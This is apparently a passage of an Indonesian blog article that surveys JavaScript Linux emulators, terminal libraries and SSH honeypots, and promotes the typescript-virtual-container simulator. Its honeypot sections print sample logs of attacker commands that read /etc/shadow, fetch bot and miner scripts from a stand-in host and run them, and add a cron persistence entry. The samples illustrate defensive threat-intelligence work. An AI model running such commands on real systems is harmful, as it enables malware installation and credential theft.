| **Arsitektur** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprieter) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Kernel asli** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Paket npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (alat CLI) |
| **Penggunaan Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (browser only) | via Wasmtime |
| **Penggunaan browser** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instance** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Waktu boot** | 15-40d | 10-30d | 10-30d | 15-40d | 2-5d | 10-40d |
| **Open source** | ✅ | ✅ | ✅ | ❌ | sebagian | ✅ |
| **Status** | ✅ sangat aktif | ✅ stabil | ⚠️ diarsipkan | ✅ komersial | ✅ aktif | ✅ aktif |

Yang menonjol dari tabel ini: `v86` adalah satu-satunya yang merupakan paket npm, berjalan di browser dan Node, dan open-source. Itulah mengapa ia mendominasi percakapan tentang "emulator Linux dalam JavaScript". Semua yang lain memiliki kekurangan -- JSLinux tidak memiliki API, jor1k diarsipkan, CheerpX berbayar, WebContainers hanya browser dan spesifik Node, container2wasm memerlukan langkah build dan CLI. Jika kamu hanya perlu "menjalankan Linux dalam JavaScript", `v86` hampir selalu merupakan titik awal yang tepat.

---

## Bagian 3 -- Stack terminal: xterm.js dan node-pty

Dua paket terus muncul ketika orang membangun pengalaman mirip shell. Mereka bukan sandbox atau emulator -- mereka adalah pipa ledeng UI dan PTY -- tetapi mereka sangat terkait sehingga saya akan merasa tidak enak jika tidak membahasnya. Juga, saya pernah menggunakan keduanya dan mereka sangat bagus.

### 3.1 `xterm.js` -- rendering terminal

xterm.js adalah emulator terminal untuk browser. Ia menampilkan layar terminal (urutan escape VT100/xterm) dalam elemen `<canvas>`, menangani input keyboard, dan mengekspos API untuk menyalurkan data.

Digunakan oleh: terminal bawaan VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, dan banyak lagi.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Mengirim data ke terminal (ditampilkan sebagai teks)
term.write("$ ");
term.onData(data => {
  // data adalah tekanan tombol -- kirim ke backend-mu
  socket.send(data);
});
socket.onmessage(msg => {
  // output dari backend -- tampilkan
  term.write(msg.data);
});
```

xterm.js hanyalah lapisan rendering. Ia tidak menjalankan shell. Ia tidak menafsirkan perintah. Ini adalah widget tampilan yang kamu hubungkan ke backend pilihanmu. Banyak orang berpikir xterm.js "yang membuat terminal" tetapi sebenarnya itu hanya layar -- kamu masih harus menghubungkannya ke sesuatu yang benar-benar mengeksekusi perintah.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- pembuatan PTY

`node-pty` membuat pseudoterminal (PTY) di Node.js dan memberimu handle baca/tulis di atasnya. Digunakan dengan xterm.js, ia memungkinkan pembangunan terminal browser yang berbicara dengan shell asli (bash, zsh, fish) yang berjalan di server.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Kirim ke xterm.js browser melalui WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Teruskan tekanan tombol dari browser ke shell
  shell.write(data);
});
```

Ini adalah pola standar untuk IDE cloud dan terminal web: xterm.js (browser) ↔ WebSocket ↔ node-pty ↔ bash asli. Tanpa isolasi. Shell berjalan dengan semua izin dari proses Node.js (atau pengguna yang meluncurkannya).

**Dirawat oleh**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Bagian 4 -- Honeypot SSH

Honeypot dirancang untuk diserang. Tujuannya adalah terlihat cukup nyata sehingga penyerang berinteraksi dengan mereka, sambil merekam semua yang mereka lakukan untuk intelijen ancaman. SSH adalah target utama karena ini adalah layanan yang paling banyak diserang di internet -- jika kamu mengekspos port 22 di IP publik, kamu akan melihat upaya pemindaian otomatis dalam hitungan menit. Cobalah suatu hari, cukup mengerikan seberapa cepat itu terjadi.

Kualitas honeypot diukur dari dua hal: **fidelitas** (seberapa meyakinkan ia meniru sistem asli) dan **telemetri** (berapa banyak data berguna yang ia tangkap). Kedua hal ini saling bertentangan. Honeypot fidelitas tinggi lebih sulit dibangun dan lebih berisiko untuk dioperasikan.

Bagian ini akhirnya yang membawa saya membangun modul `HoneyPot` di `typescript-virtual-container`, jadi saya punya beberapa opini di sini.

### 4.1 Cowrie -- standar emas

Cowrie adalah honeypot SSH dan Telnet interaksi sedang-ke-tinggi berbasis Python. Ini adalah honeypot SSH yang paling banyak digunakan di komunitas riset dan keamanan.

Arsitektur:
- **Lapisan protokol**: implementasi protokol SSH asli (Twisted Conch), jadi penyerang mendapatkan jabat tangan asli, pertukaran kunci asli, otentikasi asli
- **Lapisan shell**: sistem file palsu (menyerupai Debian 5.0) dan interpreter shell parsial yang merespons perintah umum
- **Mode proxy**: dapat meneruskan ke sistem asli di belakang (mode interaksi tinggi), merekam semua yang lewat
- **Mode LLM** (tambahan baru): menggunakan model bahasa untuk menghasilkan respons dinamis terhadap perintah yang tidak diketahui cara menanganinya -- ya, Cowrie sekarang memiliki mode AI. Kita hidup di zaman yang gila.

```python
# Apa yang ditangkap Cowrie
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie menyimpan file yang diunduh (melalui wget/curl/SFTP/SCP) untuk analisis malware. Ia terintegrasi dengan Splunk, Elasticsearch, dan platform SIEM lainnya.

**Fidelitas**: sedang-tinggi. Cukup meyakinkan untuk mengelabui bot otomatis (yang merupakan 99% penyerang SSH -- kebanyakan hanya skrip bodoh yang mencoba `root`/`password`). Manusia yang canggih dapat mengidentifikasinya melalui sidik jari, biasanya cukup cepat.

**Bahasa**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- pendahulu Cowrie

Kippo adalah honeypot SSH interaksi sedang asli yang menjadi dasar Cowrie. Ide dasarnya sama: protokol SSH asli, sistem file palsu, shell parsial. Cowrie sepenuhnya telah menggantikannya pada titik ini -- Kippo sudah diarsipkan dan tidak ada yang boleh menggunakannya di tahun 2026. Disebutkan di sini murni untuk kelengkapan historis, karena kamu mungkin melihatnya dirujuk di posting blog lama dan makalah keamanan.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- diarsipkan

---

### 4.3 endlessh -- tarpit SSH

endlessh adalah honeypot degeneratif: ia menjaga koneksi SSH tetap terbuka dengan menyiarkan data banner secara lambat pada 1 byte per detik (atau kurang). Klien SSH yang terhubung akan macet tanpa batas -- tidak akan pernah mencapai otentikasi karena server tidak pernah selesai mengirim banner.

Tujuannya bukan intelijen ancaman tetapi penolakan sumber daya murni: mengisi utas pemindaian penyerang sehingga mereka tidak dapat mencapai target asli secepat itu. Sejujurnya ini agak jahat dalam arti yang baik. Kamu tidak belajar apa pun dari penyerang -- kamu hanya membuat mereka membuang-buang waktu. Ada sesuatu yang sangat memuaskan tentang itu.

```c
// Semua perilaku protokol endlessh:
// Kirim: "SSH-2.0-OpenSSH_" lalu tambahkan karakter acak secara perlahan
// Jangan pernah menutup koneksi
// Pemindai penyerang akan timeout setelah N detik
```

Tidak ada perintah yang ditangkap. Tidak ada otentikasi yang diuji. Hanya waktu koneksi.

**Ditulis dalam**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- honeypot "biarkan semua orang masuk"

sshesame menerima semua koneksi SSH (pengguna mana pun, kata sandi mana pun, kunci mana pun) dan merekam semuanya. Ini adalah honeypot tanpa interaksi: ia tidak merespons perintah, ia hanya membiarkan penyerang "masuk" dan merekam setiap tombol yang mereka ketik.

```
2024-01-15 03:22:11 Koneksi dari 45.33.32.156
  Pengguna: root, Kata Sandi: password123 -- diterima
  Perintah yang diketik:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Terputus setelah 47d
```

Berguna untuk pengumpulan kredensial: kamu dengan cepat mengumpulkan nama pengguna dan kata sandi yang dicoba bot, yang memberitahumu kredensial default apa yang sedang di-bruteforce secara aktif. Spoiler: selalu `root`/`password`, `admin`/`admin`, dan `root`/`123456`. Setiap saat.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework honeypot berbasis Docker

`lyrebird/honeypot-base` adalah image dasar Docker untuk membangun honeypot layanan jaringan. Ini bukan khusus honeypot SSH -- ini adalah framework untuk membangun honeypot untuk protokol apa pun.

Image dasar menyediakan framework logging, sistem plugin untuk protokol, dan konfigurasi Docker Compose untuk honeypot multi-layanan. Kamu memperluasnya untuk mensimulasikan layanan tertentu.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Membangun honeypot SSH di Node.js -- metode naif, dan mengapa gagal

Sebelum `typescript-virtual-container`, membangun honeypot SSH di Node.js berarti menggabungkan library `ssh2` asli dengan simulasi perintah manual. Sangat melelahkan, sangat tidak lengkap, tapi... ini semacam ritus peralihan pada titik ini:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Mencatat upaya
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Biarkan semua orang masuk
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Respons simulasi
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Ini "berfungsi" dalam arti menangkap kredensial dan perintah. Tapi jelas palsu begitu penyerang yang canggih menggali sedikit. `uname -a` mengembalikan string yang benar tetapi `ls /etc` mengembalikan "command not found" -- itu jelas jebakan. Sistem file tidak ada. Perintah tidak dirantai. Pipe tidak berfungsi. Variabel tidak diperluas.

Penyerang yang kompeten akan mengidentifikasi honeypotmu dalam lima perintah pertama. Skrip otomatis yang mencari perilaku mirip Cowrie juga akan mendeteksinya segera. Ini tampaknya yang mendorong penulis `typescript-virtual-container` untuk membangun sesuatu yang benar-benar menafsirkan perintah dengan benar -- lebih lanjut di Bagian 5.

---

### Ringkasan keluarga honeypot

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naif ssh2 |
|---|---|---|---|---|---|---|
| **Tingkat interaksi** | sedang-tinggi | sedang | nol | nol | bervariasi | rendah |
| **Protokol SSH asli** | ✅ | ✅ | ❌ (tarpit) | ✅ | bervariasi | ✅ |
| **Fidelitas shell** | sedang | sedang | n/a | tidak ada | bervariasi | minimal |
| **Menangkap kredensial** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Menangkap perintah** | ✅ | ✅ | ❌ | ✅ | bervariasi | ✅ |
| **Menangkap malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integrasi SIEM** | ✅ asli | ❌ | ❌ | ❌ | ❌ | manual |
| **Respons LLM** | ✅ (baru) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Bahasa** | Python | Python | C | Go | Docker | Node.js |
| **Node.js asli** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ sangat aktif | ⚠️ diarsipkan | ✅ aktif | ✅ aktif | ✅ aktif | DIY |

Polanya cukup jelas di sini: semakin banyak fidelitas yang kamu inginkan, semakin banyak Python yang harus kamu tulis. Cowrie adalah pemenang tak terbantahkan jika kamu melakukannya dengan serius -- ia telah teruji di lapangan selama bertahun-tahun dan menangkap lebih dari sekadar kredensial sederhana. endlessh dan sshesame adalah proyek keren lebih dari sekadar alat intelijen ancaman yang serius. Dan pendekatan naif di Node.js mungkin membawamu sekitar 20% dari perjalanan sebelum kamu menabrak tembok.

---

## Bagian 5 -- `typescript-virtual-container`: yang mengisi celah

OK jadi di sinilah hal-hal menjadi menarik. Setelah mengkatalogkan semua keluarga di atas, kuadran yang hilang menjadi cukup jelas:

- JS sandbox: mengisolasi kode, tidak ada shell, tidak ada sistem file, tidak ada SSH
- Emulator Linux: OS asli, shell asli, SSH asli... tapi 150+ MB RAM, 30 detik boot, dan kamu harus membangun API-mu sendiri di atas I/O serial
- Honeypot: shell palsu, tidak ada API yang dapat diprogram, Python/Go/C, tidak asli Node

Tidak ada yang membangun lingkungan Linux lengkap, dapat diprogram, asli Node, dengan SSH asli, izin asli, jaringan virtual asli, dan API TypeScript yang diketik. Maka dia membangunnya.

Perkenalan singkat karena ini pertama kalinya saya menyebutnya dengan benar: `typescript-virtual-container` dibangun oleh [Chloé Rolzhausen](https://itsrealfortune.fr), seorang pengembang Prancis yang dipanggil **Fortune** (atau ItsRealFortune) secara online. Kamu dapat menemukannya di [situs webnya](https://itsrealfortune.fr) dan [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Seluruh proyek -- 56.000 baris TypeScript, 247 file, 170 perintah -- adalah upaya solo oleh satu orang. Saya akan memanggilnya Fortune untuk sisa artikel. Dan ya, itu cukup gila. Lihatlah karyanya!

### Apa sebenarnya ini

`typescript-virtual-container` adalah **simulator lingkungan Linux** yang ditulis dalam TypeScript murni. Tanpa Wasm. Tanpa ekstensi native. Tanpa kernel. ~56.000 baris sumber tersebar di 247 file TypeScript.

Wawasan kuncinya: kamu tidak perlu emulator CPU untuk menjalankan `ls /etc | grep passwd`. Kamu perlu:
1. Pohon node dalam memori yang merespons operasi jalur
2. Model izin POSIX yang diterapkan pada setiap akses
3. Parser shell yang memahami pipeline, redirect, sub-shell, dan ekspansi variabel
4. ~170 implementasi perintah (fungsi, bukan biner)
5. Sistem manajemen pengguna dan grup
6. Sesuatu untuk mengekspos semua ini melalui SSH

Semua itu dapat dicapai dalam TypeScript murni tanpa keterlibatan kernel.

### VirtualFileSystem

VFS adalah pohon dalam memori dari node yang diketik -- tanpa I/O disk kecuali kamu secara eksplisit mengaktifkan mode persistensi `"fs"`:

```ts
// Representasi internal yang disederhanakan
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder yang dimuat secara lazy
```

Setiap operasi jalur melewati `normalizePath` (menyelesaikan `.`, `..`, symlink) dan `enforceAccess` (memeriksa izin baca/tulis/eksekusi terhadap uid/gid peminta). `chmod`, `chown`, sticky bit, dan setuid semuanya diimplementasikan dan benar-benar ditegakkan. Jika proses yang berjalan sebagai uid 1000 mencoba membaca file milik root dengan mode 0600, ia mendapatkan EACCES -- bukan EACCES palsu, `Error` JavaScript asli yang dilemparkan dari pemeriksaan izin. Bagian ini cukup elegan sejujurnya.

VFS dapat diserialisasi ke:
- `.vfsb` -- format biner kompak (kustom, dengan kompresi fflate) -- ini format default
- Snapshot JSON -- dapat dibaca manusia, baik untuk debugging
- Arsip TAR -- impor/ekspor dengan format tar asli, jadi kamu bisa `tar -xf` sesuatu dan VFS hanya memiliki... file-file itu
- Image SquashFS -- impor hanya-baca

Dalam mode persistensi `"fs"`, ia mempertahankan write-ahead log (WAL) untuk pemulihan setelah crash -- tulis masuk ke log terlebih dahulu, lalu ke snapshot saat flush. Jika Node crash di tengah operasi, log memungkinkanmu membangun kembali status terakhir yang lengkap.

Ada juga lapisan `FileCache` yang mensimulasikan latensi I/O disk. Kamu mengonfigurasi profil seperti `NVME_DISK_IO` atau `HDD_DISK_IO` dan VFS menunda operasi file secara artifisial untuk mencocokkan pengaturan waktu yang realistis. Yang cukup lucu -- perangkat lunak yang sengaja memperlambat dirinya sendiri untuk mensimulasikan perangkat keras -- tetapi sebenarnya sangat berguna untuk benchmarking.

### Interpreter shell

Parser shell menghasilkan AST yang diketik:

```ts
// "ls /etc | grep root && echo done" diurai menjadi:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Eksekutor menelusuri AST ini:
- Untuk pipeline, ia membuat rantai aliran `{ stdin, stdout, stderr }` dan mengeksekusi setiap perintah dengan I/O yang dipipe
- Untuk operator logika (`&&`, `||`), ia memeriksa `$?` setelah sisi kiri sebelum mengeksekusi sisi kanan
- Untuk sub-shell (`$(...)`, `` ` ` ``), ia bercabang konteks eksekusi
- Untuk redirect (`>file`, `>>file`, `2>&1`, `<file`), ia mengatur pengkabelan aliran sebelum eksekusi
- Untuk tugas latar belakang (`cmd &`), ia mengeksekusi tanpa menunggu selesai
- Untuk variabel, ia memperluas `$VAR`, `${VAR:-default}`, `${#VAR}`, dan aritmatika `$((expr))`
- Untuk ekspansi kurung kurawal (`{a,b,c}`, `{1..5}`), ia menghasilkan daftar ekspansi lengkap sebelum mengeksekusi

Semua ini adalah perilaku POSIX shell asli. Parser menangani heredoc, substitusi proses, globbing (`*`, `?`, `[abc]`), dan penanganan kutipan (kutipan tunggal, kutipan ganda dengan interpolasi, escaping backslash). Ini tidak sempurna -- kasus tepi ada -- tapi ini jauh melampaui apa yang kamu harapkan dari proyek TypeScript.

### ~170 perintah bawaan

Perintah adalah fungsi TypeScript yang terdaftar di registri perintah. Mereka menerima `CommandContext` dengan aliran stdin/stdout/stderr, VFS, sesi pengguna, lingkungan shell, dan akses ke sub-modul.

Menulis 170 implementasi perintah Unix, itu... banyak. Beberapa sepele (`echo`, `true`, `false`), beberapa sangat kompleks (`awk`, `find`, `tar`). Seperti, `awk` POSIX lengkap? Dalam TypeScript? Itu gila sejujurnya. Berikut sampel dari apa yang ada di dalamnya:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (sisi klien, koneksi keluar),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interaktif lengkap), vim (dasar), vi (dasar),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulasi), systemctl (stub), journalctl (stub),
...dan sekitar 130 lainnya
```

"Stub" (git, python3, node) merespons panggilan umum secara realistis -- `python3 --version` mengembalikan string versi yang kredibel, `git status` menunjukkan status repositori fiktif -- tanpa melakukan pekerjaan nyata. Untuk honeypot, ini sebenarnya lebih berguna daripada perintah asli, karena memungkinkanmu mengamati apa yang coba dijalankan penyerang tanpa menjalankan apa pun yang berbahaya.

### Server SSH

Lapisan SSH menggunakan paket npm `ssh2` asli -- protokol SSH asli, pertukaran kunci asli, enkripsi asli. `SSHMimic` membungkusnya:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH asli: ssh -p 2222 root@localhost
// SFTP asli: sftp -P 2222 root@localhost
// SCP asli: scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` menentukan apa yang dilaporkan `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, dan `/etc/os-release`. Kamu dapat meniru distribusi Linux dan versi kernel apa pun secara meyakinkan -- untuk klien SSH asli, secara harfiah tidak ada cara untuk membedakannya.

### Modul HoneyPot

Karena interpreter shell asli dan server SSH asli, perintah penyerang benar-benar dieksekusi di lingkungan virtual. Permintaan `wget` yang dipicu penyerang dicatat dengan URL tujuan. File yang dibuat penyerang disimpan di VFS. Upaya eskalasi hak istimewa penyerang menghasilkan kesalahan yang realistis.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Setelah sesi, membedakan sistem file
const before = shell.vfs.toSnapshot();
// ... sesi penyerang ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Ini secara kualitatif berbeda dari Cowrie. Sistem file palsu Cowrie dapat merespons `ls` tetapi tidak dapat benar-benar melacak file yang dibuat penyerang dan modifikasi yang mereka buat sebagai diff terstruktur. `typescript-virtual-container` bisa, karena VFS adalah struktur data langsung -- setiap tulis dilacak. Entri cron yang baru saja ditambahkan penyerang? Itu ada di diff. Folder `.hidden` itu? Di diff. Cukup berguna untuk analisis malware.

### Stack jaringan virtual

Ini mungkin bagian paling mengesankan dari seluruh proyek, dan tidak ada bandingannya di proyek lain di ruang ini. Seperti, stack jaringan virtual L2/L3 lengkap dengan dukungan VPN, ditulis dalam TypeScript murni, tanpa kartu jaringan nyata yang terlibat. Itu benar-benar gila.

`VirtualNetworkManager` memberikan setiap instance `VirtualShell` antarmuka jaringan virtual dengan alamat IP yang dapat dikonfigurasi, tabel routing, dan firewall perangkat lunak (aturan gaya iptables dengan conntrack dan NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` semuanya menunjukkan status jaringan virtual.

`VirtualSwitch` (bernama Baie -- dari kata Prancis untuk rak server, "baie informatique") menghubungkan beberapa shell di subnet bersama. Ia mengimplementasikan:
- MAC learning dan ARP
- Routing IP antar subnet
- NAT (masquerade keluar)
- DNS (catatan yang dapat dikonfigurasi per subnet)
- Load balancing (round-robin, least connections)
- Traffic shaping: latensi, jitter (distribusi Gaussian), packet loss, burst loss, reordering, duplikasi
- Bandwidth limiting (token bucket)
- Penerapan MTU
- Connection tracking (stateful, status NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Tiga mesin virtual di switch yang sama
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web bisa mencapai api, api bisa mencapai db, web tidak bisa mencapai db secara langsung
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Traffic shaping: mensimulasikan link WAN yang tidak stabil ke luar
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` menciptakan terowongan terenkripsi antar instance Baie -- kamu dapat mensimulasikan jaringan multi-situs dengan interkoneksi VPN antar situs.

`VirtualProxy` mengimplementasikan port forwarding dan proxy SOCKS5.

Tidak ada dari ini yang menyentuh kartu jaringan nyata. Semuanya routing objek TypeScript. Perintah `ping` "berfungsi" dengan routing melalui switch virtual dan mengembalikan respons ICMP yang disimulasikan. `curl http://192.168.0.3/api` merutekan melalui jaringan virtual, mencapai respons HTTP yang disimulasikan dari shell api, dan mengembalikan konten. Ini kura-kura sampai ke bawah, dalam arti terbaik.

### `SandboxedShell`

Untuk penggunaan programatik di mana kamu membutuhkan isolasi yang lebih kuat, `SandboxedShell` menjalankan sesi shell dalam thread Worker Node.js:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% dari satu core
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Isolasi di sini disediakan oleh lapisan VFS (shell thread worker hanya dapat melihat sistem file virtual, tidak pernah sistem file host) ditambah isolasi memori thread Worker Node.js. Ini lebih ringan dari `isolated-vm` tetapi lebih tepat untuk isolasi tingkat shell daripada tingkat JS.

### Pembatasan sumber daya

Kamu dapat mengonfigurasi batas sumber daya per shell yang memengaruhi apa yang dilaporkan perintah pemantauan sistem:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Di dalam shell ini, `free -m` menunjukkan 512 MB RAM total. `nproc` mengembalikan 2. `/proc/meminfo` menunjukkan nilai yang dibatasi. `htop` dan `top` menunjukkan jumlah CPU yang dibatasi. Ini memungkinkanmu menentukan dengan tepat jejak perangkat keras mesin yang disimulasikan.

### Tiga mode deployment

```
Mode 1: Server SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Protokol SSH asli, SFTP asli, SCP asli
  → Kasus penggunaan: honeypot, lingkungan pengujian jarak jauh, lab pelatihan

Mode 2: Shell web (browser)
  builds/fortune-nyx-v1.7.6-web.min.js (bundel ESM)
  → Berjalan di browser, VFS dipersist di IndexedDB
  → Kasus penggunaan: tutorial interaktif, terminal tertanam, demo
  → Bonus: menjalankan startxfce4 untuk desktop XFCE lengkap yang disimulasikan

Mode 3: CLI mandiri
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (satu file, tanpa instalasi)
  → curl dan jalankan, VFS dipersist di direktori .vfs/
  → Kasus penggunaan: demo cepat, eksperimen lokal
```

### Polyfill -- bagaimana build browser bekerja tanpa Wasm

OK ini bagian yang menurut saya sangat cerdas dan ingin saya soroti secara khusus.

Membuat library Node.js berfungsi di browser biasanya merupakan mimpi buruk. Entah kamu menggunakan runtime Wasm (berat, lambat dimuat), atau kamu menghabiskan berminggu-minggu mengganti setiap import `node:*` secara manual dengan alternatif yang kompatibel dengan browser. Fortune melakukan yang kedua -- tetapi sangat bersih, dengan menulis satu set polyfill kustom yang tinggal di direktori `polyfills/` repositori.

Pipeline build hanyalah esbuild dengan banyak entri `alias`:

```js
// demo/build.js -- semua konfigurasi build browser
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Tanpa Wasm. Tanpa library polyfill eksternal. Tanpa hal-hal `webpack-node-externals`. Hanya modul yang dialiaskan dan beberapa global yang diinjeksikan. Biarkan saya merinci masing-masing karena beberapa sangat mengesankan.

**`node:fs` -- IndexedDB sebagai sistem file palsu**

Yang ini favorit saya. Polyfill `node:fs` mengimplementasikan API sinkron Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) yang didukung oleh dua lapisan: `Map` dalam memori untuk pembacaan sinkron, dan IndexedDB untuk persistensi antar reload halaman. Tulis masuk ke Map segera (jadi `readFileSync` tepat setelah `writeFileSync` selalu berfungsi), kemudian di-flush ke IndexedDB secara asinkron di latar belakang.

```js
// Cache sinkron (path → Uint8Array | null) -- pembacaan instan
const memCache = new Map();

// Pramuat semuanya dari IndexedDB ke memCache saat startup
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

